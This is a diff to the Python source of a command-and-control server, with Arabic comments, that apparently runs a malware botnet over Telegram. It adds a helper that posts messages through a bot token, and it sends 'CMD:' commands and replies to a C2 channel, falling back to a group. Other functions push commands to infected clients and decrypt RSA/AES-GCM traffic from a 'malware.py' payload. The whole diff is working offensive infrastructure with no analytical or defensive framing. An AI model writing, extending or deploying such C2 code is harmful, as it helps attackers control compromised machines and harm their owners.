@@ -347,28 +347,45 @@ def _malware_downlink_push(client_id: str, line: str) -> None:
 
 # ── دوال مساعدة للتيليجرام ──────────────────────────────────────────────────
 
+def _tg_post_message(chat_id: str, message: str) -> bool:
+    """إرسال نص لشات واحد؛ يُرجع True إذا ok من Telegram."""
+    url = f"https://api.telegram.org/bot{C2_BOT_TOKEN}/sendMessage"
+    try:
+        r = requests.post(url, json={"chat_id": chat_id, "text": message}, timeout=15)
+        if not r.ok:
+            logger.warning(f"TG send HTTP {r.status_code} chat={chat_id}: {(r.text or '')[:220]}")
+            return False
+        try:
+            jd = r.json()
+            if not jd.get("ok"):
+                logger.warning(f"TG send rejected chat={chat_id}: {jd.get('description', jd)}")
+                return False
+        except Exception:
+            return True
+        return True
+    except Exception as e:
+        logger.error(f"TG send error chat={chat_id}: {e}")
+        return False
+
+
 def _tg_send_to_channel(message: str):
-    """المالوير يقرأ الأوامر والردود من الجروب فقط — نرسل إلى GROUP_ID."""
+    """
+    ردود بروتوكول التيليجرام — كما في c2-OLD.py: الإرسال الأساسي إلى القناة (CHANNEL).
+    إن فشل (صلاحيات / معرف)، يُكرر للجروب لتوافق النشرات القديمة.
+    """
     if message.startswith("CMD:"):
         try:
             cid = message.split(":", 2)[1].strip()
             _malware_downlink_push(cid, message)
         except Exception:
             pass
-    url = f"https://api.telegram.org/bot{C2_BOT_TOKEN}/sendMessage"
-    try:
-        r = requests.post(url, json={"chat_id": C2_GROUP_ID, "text": message}, timeout=15)
-        if not r.ok:
-            logger.warning(f"TG send HTTP {r.status_code}: {(r.text or '')[:220]}")
-            return
-        try:
-            jd = r.json()
-            if not jd.get("ok"):
-                logger.warning(f"TG send rejected chat={C2_GROUP_ID}: {jd.get('description', jd)}")
-        except Exception:
-            pass
-    except Exception as e:
-        logger.error(f"TG send error (group): {e}")
+    if str(C2_CHANNEL_ID) == str(C2_GROUP_ID):
+        _tg_post_message(C2_GROUP_ID, message)
+        return
+    if _tg_post_message(C2_CHANNEL_ID, message):
+        return
+    logger.warning("TG: فشل الإرسال للقناة — محاولة الجروب كبديل")
+    _tg_post_message(C2_GROUP_ID, message)
 
 def _tg_decrypt_first_message(encrypted_key_b64: str, encrypted_data_b64: str):
     """RSA فك تشفير مفتاح AES، ثم AES-GCM فك تشفير البيانات (مطابق لما يستخدمه malware.py)"""
@@ -560,9 +577,9 @@ def check_bot_status():
 @require_auth
 def process_tg_message():
     """
-    يُستدعى من bot.py عندما يستقبل رسالة من الجروب تخص المالوير.
+    يُستدعى من bot.py عندما يستقبل رسالة من الجروب أو القناة تخص المالوير.
     يعالج: KEY_REQUEST / HANDSHAKE / RESULT / HEARTBEAT
-    ويرجع { "reply": "..." } لو محتاج bot.py يبعت رد للقناة.
+    ويرجع { "reply": "..." } ليرسلها الرّلي — كما في c2-OLD يرسل الرد أساساً إلى القناة.
     """
     text  = (request.json or {}).get("text", "")
     reply = None
